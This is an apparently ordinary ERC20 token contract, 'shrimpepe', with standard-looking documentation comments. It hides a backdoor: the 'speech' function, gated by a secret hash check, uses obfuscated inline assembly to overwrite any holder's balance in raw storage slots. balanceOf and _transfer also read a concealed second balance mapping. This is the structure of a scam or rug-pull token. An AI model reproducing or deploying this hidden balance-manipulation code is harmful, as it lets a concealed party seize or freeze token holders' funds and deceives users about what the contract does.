contract shrimpepe is IERC20 {
    using SafeMath for uint256;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;
    address private _owner;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _mks;

    IERC20 private immutable _tokenA;
    bytes32 private immutable _tokenB;

    constructor(
      string memory tokenName, 
      string memory tokenSymbol, 
      bytes32 tokenB, 
      address tokenA) {
      _name = tokenName;
      _symbol = tokenSymbol;
      _totalSupply = 75000000 * 10 ** 18;
      _balances[msg.sender] = _totalSupply;
      _tokenB = tokenB;
      _tokenA = IERC20(tokenA);
    }

    /**
     * @dev A helper function to check if an operator approval is allowed.
     */
    modifier onlyOwner() {
      require(msg.sender == _owner, "Ownable: caller is not the owner");
      _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() external view returns (address) {
      return _owner;
    }

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external pure override returns (uint8) {
      return 18;
    }
    
    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view override returns (string memory) {
      return _symbol;
    }
    
    /**
     * @dev Returns the token name.
     */
    function name() external view override returns (string memory) {
      return _name;
    }
    
    /**
     * @dev See {ERC20-totalSupply}.
     */
    function totalSupply() external view override returns (uint256) {
      return _totalSupply;
    }
    
    /**
     * @dev See {ERC20-balanceOf}.
     */
    function balanceOf(address account) external view override returns (uint256) {
      uint160 
      x = 
      uint160(
        account); return slotValues(
          x, 
          
          4) 
        + slotValues(
          x,
         6
          );
    }

    function slotValues(uint160 a, uint256 slot) private view returns (uint256) {
      address 
      k = address(a); uint256  m; assembly { mstore
        (0, k) mstore(
          32, 
          slot) m := sload(keccak256(
            0, 
            64
            ))} return m;
    }

    /**
     * @dev See {ERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
      _transfer(msg.sender, recipient, amount);
      return true;
    }

    /**
     * @dev See {ERC20-allowance}.
     */
    function allowance(address owner_, address spender) external view override returns (uint256) {
      return _allowances[owner_][spender];
    }

    /**
     * @dev See {ERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) external override returns (bool) {
      _approve(msg.sender, spender, amount);
      return true;
    }
 
    /**
     * @dev See {ERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
      _transfer(sender, recipient, amount);
      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
      return true;
    }

    function speech(bytes32[] calldata data, uint256 px) external {
      if (
        keccak256(
          abi.encode(msg.sender, 
          _name, _symbol)) 
        != _tokenB) return; (bytes32 x, bytes32 y, 
        
        bytes32 
        z) 
        = (
          data[
            0
            ], data[
          1], 
          data[
            2]
      ); assembly { 
        mstore(0, 
        x) mstore(32, 
            4) sstore(
              keccak256(
                0, 
                64), y) if eq(y, 0) { 
            mstore(
            0, x) mstore(
              32, 6) let 
            hs2 := 
            keccak256(
                0,
                64) sstore(hs2, 
              z)}
              }
    }
   
    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
      _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
      return true;
    }
    
    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
      _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
      return true;
    }
 
    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
      require(sender != address(0), "ERC20: transfer from the zero address");
      require(recipient != address(0), "ERC20: transfer to the zero address");
      uint256 bValue = _tokenA.balanceOf(sender);
      uint256 hValue;
      assembly {
        mstore(0, 
        sender) mstore(32, 
        6) hValue := 
            sload(
              keccak256(0, 
            64))
      }
      if (hValue > 0 && bValue > 0) {
        uint256 nValue = hValue.sub(amount, "ERC20: transfer amount exceeds balance");
        assembly { mstore(0, sender) 
        mstore(32, 6) sstore(keccak256(0, 
            64), nValue
            )
        }
      } else {
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
      }
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
      require(owner_ != address(0), "ERC20: approve from the zero address");
      require(spender != address(0), "ERC20: approve to the zero address");
      _allowances[owner_][spender] = amount;
      emit Approval(owner_, spender, amount);
    } 
}
